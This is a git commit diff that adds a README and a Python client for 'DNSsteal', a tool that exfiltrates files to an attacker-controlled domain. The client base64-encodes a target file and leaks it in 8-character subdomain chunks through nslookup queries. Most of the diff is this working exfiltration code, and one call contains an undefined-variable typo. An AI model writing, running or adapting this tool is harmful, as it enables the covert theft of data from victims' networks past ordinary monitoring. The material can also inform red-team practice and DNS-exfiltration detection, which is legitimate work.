a2c6bb0938e8321983357d6b45963290a24fd201
AnnaPrattt <annapratt6@gmail.com>
2025-06-15 08:51:34 -0600

    ReadME, requirements, client.py updated

--- README.md
+++ README.md
@@ -1,2 +1,37 @@
-# dnssteal
-Automate exfiltration of data over DNS
+![logo](logo.jpg)
+
+**DNSsteal** -- An automatic DNS exfiltration tool
+
+# Purpose
+Attacker's frequently use expected protocols to exfiltrate information out of victim environments. DNS can be particularly effective for exfiltration given the protocol's ubiquitous use in practically every environment. 
+
+This tool takes an input file, encodes the data, and exfiltrates the data to an attacker-controlled domain using subdomains.
+
+# Requirements
+Run the command:
+```python
+pip3 install -r requirements.txt
+# installs argparse
+```
+The tool uses `base64`, `subprocess`, `os`, and `datetime` which are already part of the default Python3 installation.
+
+This tool was written in Python3. <br>
+This tool was tested on both Windows and Unix.
+
+# Usage
+Run the tool:
+```python
+python3 client.py -d <attacker domain> -f <data file>
+```
+The tool accepts the following arguments:
+```python
+-d, --domain       Attacker-controlled domain    # required
+-f, --file         Target data file to exfiltrate #required
+-s, --server       IP address of DNS server to query #optional
+-h, --help         Show help menu
+
+```
+
+
+# Future Work
+* Introduce sequencing mechanism for DNS packets
--- client.py
+++ client.py
@@ -1,25 +1,27 @@
-import dnspython
+#! /usr/bin/env python3
+
+import subprocess
 import os
 import argparse
 import base64
-from datetime import datetime
+import datetime
 
 # declare constants
-DEFAULT_DNS_IP = "8.8.8.8" # default use Google DNS server
-LOG_ERROR_TARGET_FILE = "errors.txt"
+DEFAULT_DNS_IP = "8.8.8.8" # variable for the DNS server to query
+LOG_ERROR_TARGET_FILE = "errors.txt" #variable for the destination file for the error log
+SIZE_OF_SUBDOMAIN = 8 #variable for the number of characters in the subdomain in the DNS query
 
 # initialize the logging file
 logError = ""
-currentTimeObject= datetime.now()
-currentTimestamp = currentTimeObject.timestamp()
-logError = str(currentTimestamp) + "\n"
+currentTime = str(datetime.datetime.now())
+logError = logError + currentTime + "\n"
 
 # import arguments from the command line
 parser = argparse.ArgumentParser(description="DNS Steal")
 
 parser.add_argument("-d", "--domain", type=str, required=True, help="Attacker-controlled domain") # the domain field is required
 parser.add_argument("-f", "--file", type=str, required=True, help="file path of file to exfiltrate") #the file field is required
-parser.add_argument("-s", "--server", type=str, required=True, help="DNS server [IP] for querying") #this is optional
+parser.add_argument("-s", "--server", type=str, help="DNS server [IP] for querying") #this is optional
 
 cliArguments = parser.parse_args()
 
@@ -51,8 +53,33 @@ dataEncoded = dataBase64Bytes.decode("ascii")
 
 # remove padding of equal signs (=), if any exist. 
 # most base64 decoders can decode just fine without the padding.
-while dataEncoded[-1] == "=":
-    dataEncoded = dataEncoded[:-1]
+if (len(dataEncoded) > 0): #error checking for empty file
+    while dataEncoded[-1] == "=":
+        dataEncoded = dataEncoded[:-1]
+
+# send our DNS queries
+lenOfData = len(dataEncoded)
+while lenOfData >= SIZE_OF_SUBDOMAIN:
+    subdomain = dataEncoded[:SIZE_OF_SUBDOMAIN]
+    fullQuery = subdomain + "." + attackerDomain
+    print(fullQuery)
+    try:
+        subprocess.run(["nslookup", fullQuery, dnsServer])
+    except:
+        logError = logError + "Unable to find domain: " + fullQuery + "\n"
+    dataEncoded = dataEncoded[SIZE_OF_SUBDOMAIN:]
+    lenOfData = len(dataEncoded) # recalculate size of the remaining data 
+
+# send the last query, which may be shorter than SIZE_OF_SUBDOMAIN
+# error check for 0
+if (lenOfData != 0):
+    subdomain = dataEncoded
+    fullQuery = subdomain + "." + attackerDomain
+    try:
+        subprocess.run(["nslookup", fullQuer, dnsServer])
+    except:
+        logError = logError + "Error querying domain: " + fullQuery + "\n"
+    print(fullQuery)
 
 # write out error log 
 with open(LOG_ERROR_TARGET_FILE, "a") as fileStreamError:
